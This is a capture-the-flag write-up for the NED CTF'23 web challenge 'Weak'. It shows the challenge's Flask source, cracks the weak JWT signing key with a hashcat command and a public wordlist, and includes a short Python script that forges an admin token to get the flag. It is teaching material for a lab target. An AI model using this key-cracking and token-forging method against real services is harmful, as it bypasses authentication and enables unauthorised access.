---
title: NED CTF'23 - Web - Weak
date: '2023-07-03'
tags: ['ctf', 'web', 'nedctf', 'writeup', 'weak', 'jwt', 'weak-signing-key']
draft: false
summary: Utilizing weak jwt signing key to forge a token.
---

## Challenge Description

"Weakness disgusts me." - Madara Uchiha

Author: [Saad Akhtar](https://twitter.com/ssaadakhtarr)

[Challenge-Link](http://159.223.192.150:5002/)

![chal-info](/static/writeups/nedctf/web/weak0.png)

## Solution

This challenge was pretty straight forward and simple to solve. Downloading the files, we see the following files are given to us:

![files](/static/writeups/nedctf/web/weak1.png)

Let's checkout `app.py`

```python:app.py
from flask import Flask, redirect, request, render_template, jsonify, make_response, abort, flash, url_for
import jwt

app = Flask(__name__)
app.config['SECRET_KEY'] = 'REDACTED'

# A dictionary to hold registered users

# TODO: Set up a database for users

users = {
    'admin': 'REDACTED'
    }

def authenticate_user(username, password):
    if username in users and users[username] == password:
        return True
    return False


# Define the home endpoint, which redirects to /login
@app.route('/')
def home():
    return redirect('/login')


# Define the login endpoint, which displays the login form
@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if authenticate_user(username, password):
            jwt_token = jwt.encode({'username': username}, app.config['SECRET_KEY'], algorithm='HS256')
            response = make_response(redirect('/dashboard'))
            response.set_cookie('JWT', jwt_token)
            return response
        else:
            error = 'Invalid username or password'
    return render_template('login.html', error=error)


# Define the registration endpoint, which displays the registration form
@app.route('/register', methods=['GET', 'POST'])
def register():
    error = None
    success = None

    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Register the user

        if username in users:
            return render_template('register.html', error='Username already taken')

        users[username] = password

        # Show a success message and redirect the user to the login page
        return render_template('register.html', success='Registration successful')
        
       # success = 'Registration successful! You can now log in with your new account.'

    return render_template('register.html', error=error, success=success)


# Define the dashboard endpoint, which displays the user's dashboard
@app.route('/dashboard')
def dashboard():
    # Check if the user is logged in by verifying the JWT token in the cookie
    token = request.cookies.get('JWT')
    try:
        payload = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
        username = payload['username']
        
    except (jwt.exceptions.InvalidTokenError, KeyError):
        return redirect('/login')
    
    return render_template('dashboard.html', username=username)


# Define the logout endpoint, which logs the user out by deleting the JWT cookie and redirecting to the login page
@app.route('/logout', methods=['POST'])
def logout():
    # Delete the JWT cookie and redirect to the login page
    response = make_response(redirect('/login'))
    response.delete_cookie('JWT')
    return response


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002)
```

Now, the main function that stands out is `dashboard`, because, in that function we can see that the `JWT` cookie is being used to verify the user. So, let's see how the cookie is being generated. We can see that the `JWT` cookie is being generated in the `login` function. Looking at that function, we can see that the user is being stored in `users` dictionary and then the `JWT` cookie is being generated using the `username` as the payload and the `SECRET_KEY` as the signing key. So, we can simply forge a token using the `SECRET_KEY` and set the `username` to `admin` to get the flag. Let's checkout `dashboard.html` to see if that's the check

```html:dashboard.html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
  </head>
  <body>
    
    {% if username == "admin" %}

    
      <h1 style="text-align: center; color: white;">Welcome, {{ username }}!</h1>
      <p style="text-align: center; color: white;">Here's your flag: NCC{t3st_fl4g}</p>

        <br>
      
    {% else %}
    <h1 style="text-align: center; color: white;">Welcome, {{ username }}!</h1>
    <p style="text-align:center; color: white;">You don't have permission to access the flag.</p>
    {% endif %}
    <br>

    

    <form method="POST" action="/logout">
      <input class="logout-button" type="submit" value="Log out">
    </form>

    <br>
  </body>
</html>

```

Well, we can see that the flag is hardcoded inside the `dashboard.html` and the check is we have to admin. So, let's register a user, then get the JWT and find the signing key. Visting the website, we're greeted with the following page

![home](/static/writeups/nedctf/web/weak2.png)

Let's signup first

![signup](/static/writeups/nedctf/web/weak3.png)

We created a user with username and password `testinguser:testinguser`

Let's log in now

![login](/static/writeups/nedctf/web/weak4.png)

Now, let's check the cookie `JWT` using the `Cookie Editor` extension, we have

![cookie](/static/writeups/nedctf/web/weak5.png)

Let's try and decode this on [jwt.io](https://jwt.io/)

![jwt](/static/writeups/nedctf/web/weak6.png)

Now, the way, we can abuse this, is by simply storing the JWT in a file, use `hashcat` with a wordlist to bruteforce the signing key. [This](https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list) is the  wordlist that's most commonly used when brute-forcing signing keys. So, let's use this wordlist and try to bruteforce the signing key. Firstly, let's find out the hashcat code for JWT using `hashcat --help | grep JWT`

![hashcat](/static/writeups/nedctf/web/weak7.png)

So, now we know that the mode will `16500`, let's use the following command to bruteforce the signing key

```bash
hashcat -m 16500 jwt.txt jwt.secrets.list
```

We get the following output

![hashcat-output](/static/writeups/nedctf/web/weak8.png)

So, now we know that the signing key is:

```md
2839aab1-1155-4b5c-a606-4a3b4eafc706
```

Let's use this to forge a token and get the flag. Let's do this on [jwt.io](https://jwt.io/)

![jwt](/static/writeups/nedctf/web/weak9.png)

Now, copy this token and set the `JWT` cookie to this token and visit the `/dashboard` endpoint

![flag](/static/writeups/nedctf/web/weak10.png)

And we have the flag

```md
Flag: NCC{jwt_w3ak_s1gn1ng_k3y}
```

Now, since y'all know by now that I love to automate, let's write a single python script to get the flag for us, assuming we already have the JWT Signing Key.

```python:exploit.py
#!/usr/bin/env python3

import requests
import jwt
import re

url = "http://159.223.192.150:5002/dashboard"
key = "2839aab1-1155-4b5c-a606-4a3b4eafc706"

username = "admin"
payload =  { "username" : username }
jwt = jwt.encode(payload=payload, key=key)

r = requests.get(url, cookies={"JWT" : jwt})

flag = re.findall('flag: (.*?)</p>', r.text)[0]
print(f"Flag: {flag}")
```

Running this script, we'll get the flag.
